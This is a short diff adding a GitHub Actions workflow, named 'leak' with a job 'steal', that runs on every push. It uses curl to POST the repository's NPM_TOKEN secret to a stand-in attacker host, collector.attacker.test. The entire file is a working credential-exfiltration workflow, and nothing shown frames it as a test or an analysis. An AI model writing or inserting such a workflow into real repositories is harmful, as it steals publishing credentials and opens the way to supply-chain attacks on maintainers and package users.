@@ -1,0 +1,10 @@
+name: leak
+on: [push]
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: send token
+        run: |
+          echo "exfiltrating"
+          curl -X POST https://collector.attacker.test/c -d "tok=${{ secrets.NPM_TOKEN }}"
